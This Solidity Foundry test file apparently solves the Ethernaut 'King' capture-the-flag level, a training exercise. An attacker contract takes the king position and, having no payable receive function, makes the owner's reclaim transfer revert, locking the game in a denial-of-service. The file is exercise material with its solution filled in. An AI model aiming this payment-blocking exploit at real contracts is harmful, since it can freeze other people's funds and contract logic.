// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

/// @dev Become king, then make sure the next kingship payment to you reverts.
///      King.receive does: payable(king).transfer(msg.value);
///      .transfer only forwards 2300 gas — and reverts if the receive fails.
contract AttackKing {
    King public immutable target;

    constructor(King _target) {
        target = _target;
    }

    // Claim the throne (send enough ETH).
    function attack() external payable {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // Tip: become king by sending ETH to King (hits receive):
        //   (bool ok,) = address(target).call{value: msg.value}("");
        //   require(ok);
        // ========== END ATTACK LOGIC ==========
        (bool ok,) = address(target).call{value: msg.value}("");
        require(ok);
    }

    // ========== ALSO CONSIDER ==========
    // What happens when King tries: payable(king).transfer(msg.value)?
    // If `king` is this contract, you can make that transfer fail
    // (e.g. no payable receive/fallback, or a receive that reverts).
    // ==================================
}

contract KingTest is Test {
    King public target;
    AttackKing public attackContract;

    address public deployer = makeAddr("deployer"); // acts like the Ethernaut level/owner
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deployer is initial king with some prize (like the level instance).
        vm.deal(deployer, 10 ether);
        vm.startPrank(deployer);
        target = new King{value: 1 ether}();
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackKing(target);
        vm.stopPrank();

        vm.deal(attacker, 10 ether);
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   After the level (owner) tries to reclaim kingship, YOU are still king.
        //   The reclaim uses receive() → payable(king).transfer(...).
        //   If that transfer reverts, reclaim fails and you keep the crown.
        //
        // Hints:
        //   1. Become king with your AttackKing contract (not the EOA), bidding >= prize
        //   2. Make AttackKing unable to accept ETH via .transfer (2300 gas / revert)
        //   3. Then owner’s reclaim attempt should fail

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        // e.g. attackContract.attack{value: target.prize()}();
        // ========== END EXPLOIT ==========
        attackContract.attack{value: target.prize()}();
        vm.stopPrank();

        // Simulate Ethernaut submitting the instance: owner tries to reclaim.
        uint256 reclaimValue = target.prize();
        vm.deal(deployer, reclaimValue);
        vm.prank(deployer);
        (bool reclaimOk,) = address(target).call{value: reclaimValue}("");

        // Level beats you if reclaim succeeds. You win if reclaim fails and you stay king.
        assertFalse(reclaimOk, "owner should NOT be able to reclaim kingship");
        assertEq(target._king(), address(attackContract), "attack contract should remain king");
    }
}
